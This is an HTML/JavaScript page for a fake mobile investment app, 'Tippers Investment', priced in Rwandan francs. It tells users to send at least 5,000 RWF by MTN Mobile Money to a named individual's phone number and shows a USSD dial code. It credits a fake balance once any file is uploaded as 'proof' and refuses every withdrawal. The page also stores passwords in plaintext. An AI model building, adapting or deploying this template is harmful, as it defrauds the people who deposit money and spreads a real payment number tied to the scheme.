<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0f172a;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

.app{
width:400px;
background:#111827;
border-radius:20px;
overflow:hidden;
color:white;
}

.header{
background:black;
padding:15px;
text-align:center;
font-weight:bold;
}

.content{
padding:15px;
height:520px;
overflow-y:auto;
}

/* COLORS */
.yellow{color:#facc15}

/* INPUT */
input,select{
width:100%;
padding:10px;
margin-top:6px;
border-radius:8px;
border:none;
outline:none;
}

button{
width:100%;
padding:12px;
margin-top:12px;
border:none;
border-radius:10px;
background:#facc15;
font-weight:bold;
cursor:pointer;
}

/* CARDS */
.card{
background:#1f2937;
padding:15px;
margin-bottom:10px;
border-radius:12px;
cursor:pointer;
}

/* NAV */
.nav{
display:flex;
justify-content:space-around;
background:black;
padding:10px;
}

.nav div{text-align:center;font-size:12px;cursor:pointer}
.nav i{font-size:22px;display:block}

/* BOX */
.box{
background:#1f2937;
padding:12px;
border-radius:10px;
margin-top:10px;
}

.inputBox{
display:flex;
background:#facc15;
border-radius:10px;
overflow:hidden;
}

.inputBox span{
padding:10px;
background:#f59e0b;
}

.inputBox input{
flex:1;
border:none;
padding:10px;
}

.copy{
background:#facc15;
padding:5px 10px;
border-radius:6px;
cursor:pointer;
margin-left:10px;
}

.passBox{position:relative}
.eye{
position:absolute;
right:10px;
top:12px;
cursor:pointer;
color:black;
}

.hidden{display:none}

#toastBox{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:black;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

</style>
</head>

<body>

<div class="app">
<div class="header">Tippers Investment</div>
<div class="content" id="screen"></div>

<div class="nav hidden" id="bottomNav">
<div onclick="home()"><i>🏠</i>HOME</div>
<div onclick="deposit()"><i>💰</i>DEPOSIT</div>
<div onclick="withdrawUI()"><i>📤</i>WITHDRAW</div>
</div>
</div>

<div id="toastBox"></div>

<script>

let users=JSON.parse(localStorage.getItem("users"))||[];
let currentUser=null;
let currentAmount=0;
let senderName="";

function get(id){return document.getElementById(id);}

function toast(msg){
let t=get("toastBox");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2000);
}

/* WELCOME */
function welcome(){
get("screen").innerHTML=`
<h2 class="yellow">Welcome to Tippers</h2>
<p>Grow your income smartly</p>
<button onclick="login()">Start</button>
`;
}

/* REGISTER */
function register(){
get("screen").innerHTML=`

<p class="yellow"><b>Most welcome to Tippers investment!</b></p>

<h3>Register</h3>

<label>FIRST NAME</label>
<input id="fname">

<label>EMAIL</label>
<input id="email" placeholder="Enter your email">

<label>PASSWORD</label>
<div class="passBox">
<input id="pass" type="password">
<span class="eye" onclick="toggle('pass')">👁</span>
</div>

<label>CONFIRM PASSWORD</label>
<div class="passBox">
<input id="cpass" type="password">
<span class="eye" onclick="toggle('cpass')">👁</span>
</div>

<button onclick="doRegister()">Register</button>

<p onclick="login()" style="color:#facc15;cursor:pointer">Login</p>
`;
}

/* LOGIN */
function login(){
get("screen").innerHTML=`

<h3>Login</h3>

<input id="logEmail" required placeholder="Enter email">
<input id="logPass" required type="password" placeholder="Enter password">

<div class="passBox">
<span class="eye" onclick="toggle('logPass')">👁</span>
</div>

<button onclick="doLogin()">Login</button>

<p onclick="register()" style="color:#facc15;cursor:pointer">Create account</p>
`;
}

/* HOME */
function home(){
get("screen").innerHTML=`

<div class="card" onclick="openCard('balance')">💰 Balance: ${currentUser.balance} RWF</div>
<div class="card" onclick="openCard('plans')">📊 Investment Plans</div>
<div class="card" onclick="openCard('tips')">💡 Tips</div>
<div class="card" onclick="openCard('news')">📢 News</div>

`;
}

/* OPEN CARDS */
function openCard(type){
if(type==="balance"){
get("screen").innerHTML=`<div class="box">Your balance is ${currentUser.balance} RWF</div>`;
}
if(type==="plans"){
get("screen").innerHTML=`<div class="box">Plans: Daily, Weekly, Monthly profits</div>`;
}
if(type==="tips"){
get("screen").innerHTML=`<div class="box">Tip: Invest wisely to grow faster</div>`;
}
if(type==="news"){
get("screen").innerHTML=`<div class="box">New bonuses coming soon!</div>`;
}
}

/* DEPOSIT */
function deposit(){
get("screen").innerHTML=`

<h3 class="yellow">DEPOSIT BALANCE</h3>

<p>Add funds using MTN Mobile Money</p>

<p class="yellow">AMOUNT TO DEPOSIT (RWF)</p>

<div class="inputBox">
<span>RWF</span>
<input id="amount" placeholder="100,000">
</div>

<p>Minimum: 5,000</p>

<p class="yellow">SENDER MOBILE NAME</p>
<input id="sender" placeholder="mugabo jean paul">

<button onclick="payment()">Continue ➜</button>
`;
}

/* PAYMENT */
function payment(){
currentAmount=parseInt(get("amount").value)||0;
senderName=get("sender").value;

if(currentAmount<5000){
toast("Minimum 5000");return;
}

get("screen").innerHTML=`

<h3 class="yellow">PAYMENT INFORMATIONS</h3>

<p>Follow steps to complete payment</p>

<div class="box">Sender: ${senderName}</div>

<p>Send ${currentAmount} RWF to:</p>

<div class="box">
0795410739 
<span class="copy" onclick="copy()">Copy</span><br><br>
<span class="yellow">BARAKA Bolingo</span>
</div>

<button onclick="dial()">Dial & Pay</button>
`;
}

/* COPY */
function copy(){
navigator.clipboard.writeText("0795410739");
toast("Copied");
}

/* DIAL */
function dial(){
get("screen").innerHTML=`

<div class="box">*182*1*1*0795410739#</div>

<input type="file" onchange="enableBtn()">

<button id="btn" disabled onclick="proof()">Submit</button>
`;
}

function enableBtn(){get("btn").disabled=false;}

/* PROOF */
function proof(){
currentUser.balance+=currentAmount;
localStorage.setItem("users",JSON.stringify(users));
withdrawStep();
}

/* WITHDRAW PERIOD */
function withdrawStep(){
get("screen").innerHTML=`

<h3>Select Withdraw Period</h3>

<select>
<option>1 Day</option>
<option>1 Week</option>
<option>1 Month</option>
<option>3 Months</option>
<option>6 Months</option>
<option>12 Months</option>
</select>

<button onclick="home()">Finish</button>
`;
}

/* WITHDRAW */
function withdrawUI(){
get("screen").innerHTML=`

<h3>Withdraw</h3>

<div class="inputBox">
<span>+250</span>
<input placeholder="078xxxxxxx">
</div>

<button onclick="withdrawAction()">Withdraw</button>
`;
}

function withdrawAction(){
toast("You're not allowed before schedule");
}

/* LOGIC */
function toggle(id){
let p=get(id);
p.type=p.type==="password"?"text":"password";
}

function doRegister(){
users.push({
email:get("email").value,
pass:get("pass").value,
balance:0
});
localStorage.setItem("users",JSON.stringify(users));
toast("Registered");
login();
}

function doLogin(){
let u=users.find(x=>x.email===get("logEmail").value && x.pass===get("logPass").value);
if(!u){toast("Invalid");return;}
currentUser=u;
get("bottomNav").classList.remove("hidden");
home();
}

/* START */
welcome();

</script>

</body>
</html>
